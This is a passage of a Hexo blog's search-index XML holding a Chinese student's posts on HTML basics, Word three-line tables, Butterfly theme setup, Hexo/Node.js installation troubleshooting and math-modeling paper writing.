class="attr">src</span>=<span class="string">&quot;./multimedia/mp3/bike.mp3&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">autoplay</span>=<span class="string">&quot;autoplay&quot;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span>&gt;</span></span><br><span class="line">       你的浏览器不支持这种音乐格式。</span><br><span class="line">   <span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 视频标签 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>视频标签<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;./multimedia/mp4/goodbye.mp4&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">autoplay</span> <span class="attr">poster</span>=<span class="string">&quot;./img/animal.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;80%&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">track</span> <span class="attr">kind</span>=<span class="string">&quot;subtitles&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./multimedia/mp4/test.vtt&quot;</span> <span class="attr">srclang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">label</span>=<span class="string">&quot;English&quot;</span>&gt;</span></span><br><span class="line">       抱歉你的视频不支持嵌入字幕</span><br><span class="line">   <span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><blockquote><p>视频播放、音频播放的使用很简单，就是简单的属性堆叠，很多属性一查便知，在此只简单放一个实例</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html 表单 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表格制作</title>
      <link href="/2023/09/18/%E8%A1%A8%E6%A0%BC%E5%88%B6%E4%BD%9C/"/>
      <url>/2023/09/18/%E8%A1%A8%E6%A0%BC%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="一、常规三线表"><a href="#一、常规三线表" class="headerlink" title="一、常规三线表"></a>一、常规三线表</h2><p><img src="/2023/09/18/%E8%A1%A8%E6%A0%BC%E5%88%B6%E4%BD%9C/image-20230907135410944.png" alt="image-20230907135410944"></p><ul><li>字体：新罗马</li></ul><h2 id="二、特殊三线表"><a href="#二、特殊三线表" class="headerlink" title="二、特殊三线表"></a>二、特殊三线表</h2><h3 id="1-长表"><a href="#1-长表" class="headerlink" title="1. 长表"></a>1. 长表</h3><ul><li>excel中对半分割，粘贴到word中</li><li>设置三线表，中间插入</li></ul><h3 id="2-宽表"><a href="#2-宽表" class="headerlink" title="2.宽表"></a>2.宽表</h3><ul><li>分成几组，“续表”连接表格</li><li>布局——&gt;水平居中 针对文字</li></ul><h3 id="3-有单元格列表的表格"><a href="#3-有单元格列表的表格" class="headerlink" title="3. 有单元格列表的表格"></a>3. 有单元格列表的表格</h3><ul><li>白色断点——白色边框</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html基础知识</title>
      <link href="/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、html基本结构"><a href="#一、html基本结构" class="headerlink" title="一、html基本结构"></a>一、html基本结构</h2><ul><li><p>start task</p></li><li><p>content</p></li><li><p>end task</p></li><li><p>文档结构</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">这里的内容无法显示在网页上</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">显示在网页中的部分</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  头部信息：</p><p>  <img src="/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230913212111951.png" alt="image-20230913212111951"></p><ul><li>link：导入css</li><li>meta两种形式：<ul><li><img src="/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230913212137840.png" alt="image-20230913212137840"></li></ul></li></ul></li></ul><h2 id="二、结构标签"><a href="#二、结构标签" class="headerlink" title="二、结构标签"></a>二、结构标签</h2><ul><li><p>命名实体——&amp;xxx</p><ul><li>空格换行，只认一个——命名实体</li></ul></li><li><p>img标签</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片地址（本地/网页）&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;替代，图片无效给出文本提示&quot;</span> <span class="attr">height</span>= <span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;pix/50%&quot;</span> <span class="attr">title</span>=<span class="string">&quot;补充性说明&quot;</span></span></span><br></pre></td></tr></table></figure></li><li><p>&lt;a标签</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> =<span class="string">&quot;完整url&quot;</span> <span class="attr">target</span>=<span class="string">&quot;self(本窗口)/blank（新窗口）&quot;</span> #<span class="attr">超链接作用</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">a</span> <span class="attr">herf</span> =<span class="string">&quot;#id&quot;</span> <span class="attr">target</span>=<span class="string">&quot;self(本窗口)/blank（新窗口）&quot;</span> #<span class="attr">锚id</span></span></span><br><span class="line"><span class="tag"><span class="attr">id属性</span>：<span class="attr">id----唯一标识</span>，<span class="attr">能让锚自动连接到</span></span></span><br></pre></td></tr></table></figure></li><li><p>&lt;table标签</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">caption</span>&gt;</span>表头</span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span>标题栏</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span>#一行</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>#标题值</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span>#表体</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span>#一行</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>/<span class="attr">colspan</span>(<span class="attr">横跨</span> <span class="attr">纵跨</span>)&gt;</span>#data</span><br></pre></td></tr></table></figure></li><li><ol <p>- <p></p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span> &quot;(<span class="attr">1</span>/<span class="attr">A</span>/<span class="attr">I</span>)&quot; <span class="attr">start</span> &quot;(<span class="attr">从哪一个标号开始</span>)&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>XXX</span><br><span class="line">&lt;\ol&gt;</span><br><span class="line">#order list</span><br></pre></td></tr></table></figure></ol></li><li><p>&lt;ul———做表单</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span> &quot;(<span class="attr">1</span>/<span class="attr">A</span>/<span class="attr">I</span>)&quot; <span class="attr">start</span> &quot;(<span class="attr">从哪一个标号开始</span>)&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>XXX</span><br><span class="line">&lt;\ul&gt;</span><br><span class="line">#unorder list</span><br></pre></td></tr></table></figure></li><li><p>&lt;dl——自定义列表</p><ul><li><p>​</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>#dt的子列表</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html 基本标签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题配置踩坑</title>
      <link href="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"/>
      <url>/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原始的hexo博客界面比较简单，在查阅了很多资料以后，选择了butterfly主题，应为他的参考文档非常全面，并且配置人数也比较多，解决bug的概率也较大，本篇博客记录于butterfly主题配置完成时，后续将对现有主题经行魔改。</p></blockquote><h1 id="一、主题展示"><a href="#一、主题展示" class="headerlink" title="一、主题展示"></a>一、主题展示</h1><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915102936524.png" alt="image-20230915102936524"></p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915103117025.png" alt="image-20230915103117025"></p><h2 id="二、踩坑记录"><a href="#二、踩坑记录" class="headerlink" title="二、踩坑记录"></a>二、踩坑记录</h2><p>在本次主题更改上，由于参考了很多文档，下载了很多插件，修改了很多配置，造成后续问题排除较为困难，小博在配置过程中遇到了一些网上几乎没有解决方法的问题，在下面予以记录。</p><ol><li>图片路径问题</li></ol><p>hexo博客能够将md文档渲染成html在web上显示，但是图片的插入是需要手动配置的，尝试很多博主的教程以后找到了一种可行的解决方式：</p><ul><li><p>修改tpyro的图片路径相关设置：</p></li><li><p>安装插件，将md文档中的相对路径转换为html中的绝对路径</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915104437952.png" alt="image-20230915104437952"></p><p>  转换后的路径显示：</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915104506178.png" alt="image-20230915104506178"></p><blockquote><p>这里由于我设置的post名称为中文，所以转化成了url编码（这是自动的，网上看见说中文title无法正常显示图片，但是我实测下来是没问题的），即可以在bash中运行 <code>hexo new 中文标题</code></p></blockquote><ol start="2"><li>代码块显示问题</li></ol><p>代码块的显示坑了我好久——这里建议，在才开始搭建的时候就按照butterfly的官方说明文档安装，不要网上各种搜罗搭建博客，我就是在搭建过程中不知道什么时候安装了第三方插件用于代码显示，造成了后续博客渲染除了问题，而且没有任何报错，排除问题很麻烦。</p><ul><li><p>修改highlight显示，但是无效，</p><ul><li>前端渲染如下：</li></ul><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105230219.png" alt="image-20230915105230219"></p><ul><li>原始md文档如下：</li></ul><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105455077.png" alt="image-20230915105455077"></p><ul><li>在主题配置中，我修改了<code>highlight</code>中的配置如下：</li></ul></li></ul><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105621030.png" alt="image-20230915105621030"></p><pre><code>  可以发现，几乎所有的配置都没有生效，反而格式混乱，经过各种尝试并且又仔细阅读了官方文档：</code></pre><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105835747.png" alt="image-20230915105835747"></p><p>于是我想到可能我可能安装了第三方插件，导致格式混论，于是在网上找到一个教程，说可能下载了插件<code>“hexo-prism-plugin</code>”，于是按照教程卸载：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-prism-plugin</span><br></pre></td></tr></table></figure><p>再次修改原生配置文件中的字段：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  line_number: <span class="literal">false</span></span><br><span class="line">  auto_detect: <span class="literal">false</span></span><br><span class="line">  tab_replace: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  wrap: <span class="literal">true</span></span><br><span class="line">  hljs: <span class="literal">false</span></span><br><span class="line">prismjs:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">false</span></span><br><span class="line">  preprocess: <span class="literal">true</span></span><br><span class="line">  line_number: <span class="literal">true</span></span><br><span class="line">  tab_replace: <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后代码块样式成功显示：</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915110438643.png" alt="image-20230915110438643"></p><ol start="2"><li><p>但是如上，代码格式并没有正常显示，这个问题比较刁钻，因为这可能是原生hexo解释typro的时候潜存的一个问题：</p><p>在列表后插入代码块一定要换行！！！</p><p>如果不换行就是上面的效果。</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915110808565.png" alt="image-20230915110808565"></p></li></ol><h2 id="三、最终效果"><a href="#三、最终效果" class="headerlink" title="三、最终效果"></a>三、最终效果</h2><p>在排除完这一系列问题后，博文终于正常显示：</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915111111307.png" alt="image-20230915111111307"></p><p>接下来就是精心设计一下自己的博客啦，前期的很多图片都是网上随意找的，侧边栏等也还没有更改，后续慢慢更新！</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主题更改配置 butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数模论文写作</title>
      <link href="/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/"/>
      <url>/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>针对论文写作的初步探究，数模论文突击，根据视频做简要笔记。</p></blockquote><h2 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h2><ul><li>基于xxx方法的xxx（问题）模型</li></ul><h2 id="二、摘要"><a href="#二、摘要" class="headerlink" title="二、摘要"></a>二、摘要</h2><ul><li><p>最后写</p></li><li><p>篇幅：首页3&#x2F;4（1000）</p></li><li><p>写作技巧：</p><ul><li><p>开头：3-5行</p><ul><li>简单交代论文背景，题目研究什么</li><li>我们是怎么做的，提取关键词，用到的关键模型，方法，或者关键的逻辑。【重要】</li></ul></li><li><p>中间：</p><ul><li>模式：针对问题一、二、三</li><li>每一点如何书写：<ul><li>梳理清楚每个问题之间的关联【是并行的，还是有层次的】来决定我们的论文该如何在优秀论文的框架下进行变动，确定最后的层次</li><li>在每个问题下，要说清楚<strong>我们</strong>研究的问题【为了得到最终结果，我们应该要求的变量关系或者值&#x2F;值的范围】，我们是利用什么方法研究的，最后得到了什么结果。&#x3D;&#x3D;有数值计算一定要明确写出，如果结果过于庞杂，要给出明确结果引导【在xxx有完整结果】&#x3D;&#x3D;</li><li>注意：在阐述模型时，要解释清楚模型的<strong>关键参数含义</strong>。</li><li>总结：有问题，就要有方法，就要有结果。不管是根据题目的现有问题，还是自己提炼出的问题，都是这样。语句之间要有逻辑性。</li></ul></li></ul></li><li><p>结尾：介绍亮点（如果有），说一下推广性（如果想的出来）。</p><ul><li>要客观，站在别人的角度第一次读，要给人以说服性。</li></ul></li><li><p>废话提升</p><ul><li><p>紧密结合题目本身。</p><ul><li>eg：此模型较优–&gt;哪里优了–&gt;【<strong>有对比</strong>】【<strong>有数据</strong>】</li></ul></li></ul></li></ul></li></ul><h2 id="三、关键词"><a href="#三、关键词" class="headerlink" title="三、关键词"></a>三、关键词</h2><ul><li>个数：4-6</li><li>模型，问题</li></ul><h2 id="四、问题重述"><a href="#四、问题重述" class="headerlink" title="四、问题重述"></a>四、问题重述</h2><ul><li>目的：为了防止查重</li><li>篇幅：不超过1页</li><li>方式：从题目中总结出问题的<ul><li>背景</li><li>每个问题的进一步说明，包含一些模糊的方式方法</li></ul></li></ul><h2 id="五、问题分析"><a href="#五、问题分析" class="headerlink" title="五、问题分析"></a>五、问题分析</h2><ul><li>篇幅：不超过1页，最多不超过2页</li><li>作用：承上启下，承接问题，启发模型建立</li><li>写作模式：针对每个问题单独有一段，小标题隔开</li><li>位置：重述之后。</li><li>必要——流程图&#x2F;思维导图【每一题一个，或者要是思考得能够更加深入，就总体画一个】</li></ul><h2 id="六、模型假设"><a href="#六、模型假设" class="headerlink" title="六、模型假设"></a>六、模型假设</h2><ul><li><p>目的：简化模型</p></li><li><p>类型：</p><ul><li>题目明确给出</li><li>排除生活小概率事件</li><li>核心因素，不可过于简化</li><li>使用的模型中本身有的假设</li><li>对模型中的参数形式（或分布）假设【有验证，比如假设泊松分布，要说，图形化出来钟形】</li><li>深入挖掘模型后为了简化模型的假设【实践以后】</li></ul></li><li><p>合理性说服：【少，能就说】</p><ul><li>引用别人的资料</li><li>数据、绘图支撑</li><li>假设检验</li></ul></li><li><p>模型评价与改进——弥补 <strong>太过简化</strong> 的问题</p></li></ul><h2 id="七、符号说明"><a href="#七、符号说明" class="headerlink" title="七、符号说明"></a>七、符号说明</h2><ul><li>形式：三线表</li><li>包含：<ul><li>重要符号，一些临时的变量可以忽略，</li><li>含义解释</li><li>单位（可以不写）</li></ul></li></ul><h2 id="八、模型建立与求解"><a href="#八、模型建立与求解" class="headerlink" title="八、模型建立与求解"></a>八、模型建立与求解</h2><ul><li><p>模型选择</p><ul><li>简洁，实用</li></ul></li><li><p>写作模式：</p><ul><li>大点：问题x的模型建立与求解，【根据实际情况选择以下两种架构中的一个】</li></ul><p><img src="/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/image-20230915083737851-16947382658551.png" alt="image-20230915083737851"></p><p>​                               1.  适合小标题层数较少的情况</p><p>​                               2.  适合小标题层数较多的情况【会更加简洁】</p><ul><li><p>小点：主要层次为：</p><ol><li>模型的建立</li></ol><ul><li><p><strong>统计分析</strong>为主，无需建模【第一问，规律，统计性分析】</p><ul><li>&#x3D;&#x3D;亮点&#x3D;&#x3D;：数据检查处理<ul><li>异常值</li><li>插值</li><li>无量纲处理</li><li>统计分析软件、统计量阐释【方差..】</li><li>漂亮的图</li></ul></li></ul></li><li><p>使用已有模型建立求解</p><ul><li><p><strong>评价类</strong></p><blockquote><p>数据或条件，建立客观的指标体系</p></blockquote><ul><li><p>主观评价【无数据支撑】</p><ul><li>层次分析</li><li>模糊综合评价</li><li>综合指数法</li></ul></li><li><p>客观评价 【有数据支撑】    </p><ul><li>主成分分析</li><li>因子分析</li><li>Topsisi评价</li><li>神经网络分析</li></ul><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.明确评价目的建立指标体系</span><br><span class="line">有代表性，确定性【可量化】，独立性，区别能力</span><br><span class="line">2.指标体系规范化处理，一致化、无量纲化</span><br><span class="line">无量纲化：归一化，标准差，极值差法，功效系数</span><br><span class="line">3.确定指标体系对应的权重系数</span><br><span class="line">主管定权，客观定权</span><br><span class="line">4.选择或构造综合评价模型</span><br><span class="line">线性加权：各个指标保持独立</span><br><span class="line">非线性加权：不具有独立型</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>预测类</strong></p><blockquote><p>预测事物的一些未知属性或已知属性未来的趋势</p></blockquote><ul><li><p>中短期预测：【10-50年】</p><ul><li>回归分析</li><li>时间序列预测</li><li>微分方程预测</li></ul></li><li><p>长期预测【100年】</p><ul><li>神经网络</li><li>Logistic</li><li>微分方程</li></ul><p>步骤：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.原始数据预处理</span><br><span class="line">残缺之补全、异常值剔除等</span><br><span class="line">2.根据条件选择/建立合适的模型</span><br><span class="line">中短期、长期、大样本/小样本</span><br><span class="line">3.对模型预测结果进行误差分析</span><br><span class="line">绝对误差分析、相对误差分析等</span><br><span class="line">一般相对误差——一级0.01，二级0.05【中短期】</span><br><span class="line">——三级0.5【长期】</span><br><span class="line">4.给出最终的预测结果，回答问题</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>优化类</strong>：</p><blockquote><p>条件固定，取最优</p></blockquote><ul><li><p>根据目标函数及约束函数类型分类</p><ul><li>线性规划</li><li>非线性规划</li><li>二次规划</li></ul></li><li><p>根据决策变量的类型分类</p><ul><li>整数规划</li><li>混合整数</li><li>0-1规划</li></ul></li><li><p>其他</p><ul><li>单目标规划</li><li>动态规划与静态规划</li><li>随机规划与确定规划</li></ul><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三因素：</span><br><span class="line">目标函数</span><br><span class="line">决策变量【自变量】</span><br><span class="line">约束条件</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/Screenshot_20230906_101030_tv.danmaku.bili_edit_8.jpg" alt="Screenshot_20230906_101030_tv.danmaku.bili_edit_8"></p></li></ul></li></ul></li><li><p>结合已有模型，或者优化&#x2F;改进模型【针对优化改进的部分详细说明】</p><ul><li><p>出发点：</p><ul><li>原有模型存在一定固有缺陷</li><li>原有模型对现有模型不太实用</li><li>原模型太简单，考虑的内容太少</li></ul></li><li><p>注意点：</p><ul><li>为什么改进</li><li>如何改进<ul><li>伪代码【档次】【三线】</li><li>流程图</li></ul></li><li>前后对比【模型复杂度，准确度，时效性，可操作性…】</li></ul></li><li><p>常见的集成：</p><ul><li><p>评价类，定权更加准确</p><ul><li><strong>基于层次分析-熵权法的综合评价模型</strong></li></ul></li><li><p>预测类，小样本预测</p><ul><li><strong>基于灰色—-bp神经网络综合预测模型</strong><ul><li>灰色：数据量少，误差大</li><li>神经：数据量大，防过拟合</li><li>灰色预测未来结果 带入到神经网络，作为输入，真实作为输出、神经网络自动拟合二者差值作为误差。</li></ul></li></ul></li><li><p>评价类、预测类均可用，精度更高</p><ul><li><strong>基于遗传算法的BP伸进网络优化算法</strong><ul><li>BP：初值和阈值随机，容易陷入局部最小值</li><li>遗传算法：把初值和阈值设定得更加精确</li></ul></li></ul></li><li><p>预测类，大样本：</p><ul><li><p><strong>基于小波变换——神经网络的预测模型</strong></p><ul><li>传统神经网络的隐含层——s&#x2F;t—&gt;小波的基函数</li></ul></li></ul></li></ul></li></ul></li><li><p>模型的求解</p><ul><li>物理数学：<ul><li>务必具体的结果 单位</li></ul></li><li>评价&#x2F;预测类型<ul><li>需要结合图标&#x3D;表表现，注意格式，美观</li></ul></li><li>解释原因，给出建议等开放类赛题<ul><li>分条作答（4最多）</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="九、模型检验"><a href="#九、模型检验" class="headerlink" title="九、模型检验"></a>九、模型检验</h2><ul><li><p><strong>稳定性和敏感性分析</strong>【重点】</p><ul><li>使用场景：模型中某些参数固定，【查的资料.题目固定..】</li><li>目的：检验模型中某参数变化是否引起模型输出产生变化</li><li>稳定性：独立的参数<code>y=ax+b</code>中的<code>b</code>       <ul><li>b上下浮动%5，画出曲线，观察平整度</li></ul></li><li>敏感性：作用在变量上的参数</li><li>y-x图：与时间有关，时间横坐标</li><li>b-y图：与时间无关，只为得总体数值</li></ul></li><li><p>统计检验与误差分析</p><ul><li>统计检验——&#x3D;&#x3D;回归分析&#x3D;&#x3D;<ul><li>统计检验——假设检验</li><li>级比检验——灰色模型</li><li>一般包括t&#x2F;f</li><li>主要写在 <strong>建模过程</strong></li></ul></li><li>误差分析——预测类<ul><li><strong>建模过程</strong>：真实值和预测值的误差——&lt;0.1，计算说明</li><li><strong>末尾</strong>：无真实数据，分析目标来源，简单说明。</li></ul></li></ul></li><li><p>新旧模型对比——改进模型：</p><ul><li>结果精度</li><li>模型复杂度</li><li>模型运行效率【神经网络】</li><li>模型可推广性</li></ul></li></ul><h2 id="十、模型优缺点"><a href="#十、模型优缺点" class="headerlink" title="十、模型优缺点"></a>十、模型优缺点</h2><ul><li>优点多写</li><li>不局限于模型，包括建模过程</li><li>优点表述：（4-6）<ul><li>简洁实用，高效</li><li>创新【少】</li><li>准确</li><li>考虑全面</li><li>进行各类检验，稳定性高</li><li>模型本身的优缺点</li></ul></li><li>缺点表述：（2-4）<ul><li>受xx因素限制，未考虑xxx，影响精度</li><li>理想，降低模型普适性</li><li>考虑了xx因素，计算时间长，复杂</li><li>模型本身的缺点</li></ul></li></ul><h2 id="十一、参考文献"><a href="#十一、参考文献" class="headerlink" title="十一、参考文献"></a>十一、参考文献</h2><h2 id="十二、附录"><a href="#十二、附录" class="headerlink" title="十二、附录"></a>十二、附录</h2><ul><li>包括支撑材料的文件列表、所有源代码【模型求解】</li><li>不便展开的结果</li><li>前面的表不便全部展开的，放在附录</li><li>另起一页</li></ul><h2 id="十三、支撑材料"><a href="#十三、支撑材料" class="headerlink" title="十三、支撑材料"></a>十三、支撑材料</h2><ul><li>所有源程序以及调用说明</li><li>除题目所给数据以外的数据</li><li>较大篇幅的中间结果，图形，表格</li><li>公开渠道找到的相关资料</li></ul><h2 id="十四、特别注意"><a href="#十四、特别注意" class="headerlink" title="十四、特别注意"></a>十四、特别注意</h2><ul><li>WinRAR压缩</li><li>不要过分依赖智能算法，容易陷入局部最优值，如果使用，要极值检验</li><li>避免三把斧现象：层次分析、模糊综合评价、灰色预测与评价</li><li>一定要进行模型检验！！！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模、论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建踩坑</title>
      <link href="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/"/>
      <url>/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于网络上基于hexo+github的博客搭建框架已经记录非常详细，我的第一篇博客就记录一下搭建过程中遇到的问题。</p></blockquote><h2 id="一、Node-Js环境配置"><a href="#一、Node-Js环境配置" class="headerlink" title="一、Node.Js环境配置"></a>一、Node.Js环境配置</h2><p>Node.Js一定要注意环境变量的各种配置，具体参考博客：<a href="https://blog.csdn.net/weixin_44893902/article/details/121788104?spm=1001.2014.3001.5506"></a></p><p>以下展示关键点：</p><ul><li>​新建两个文件夹</li></ul><p>​<code>node_global</code></p><p>​<code>node_cache</code></p><p><img src="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/image-20230905144459747.png" alt="image-20230905144459747"></p><ul><li>​建立之后在管理员权限下config刚刚建立的文件夹，【目的是将利用npm下载的模块以及缓存放在这两个文件夹下】</li></ul><p>​<code>npm config set prefix &quot;node_global路径&quot;</code></p><p>​<code>npm config set cache &quot;node_cache路径&quot;</code></p><p>​剩余操作详见上述参考博文</p><h2 id="二、权限问题解决——INFO-Install-dependencies安装出错"><a href="#二、权限问题解决——INFO-Install-dependencies安装出错" class="headerlink" title="二、权限问题解决——INFO Install dependencies安装出错"></a>二、权限问题解决——INFO Install dependencies安装出错</h2><ul><li><p>具体报错：</p><p>- </p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br><span class="line">INFO Cloning hexo-starter ![img](file:///C:\Users\Jake\AppData\Roaming\Tencent\QQTempSys\[5UQ[BL(6~BS2JV6W&#125;N6[%S.png)https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO Install dependencies</span><br><span class="line"><span class="string">&#x27;npm&#x27;</span> 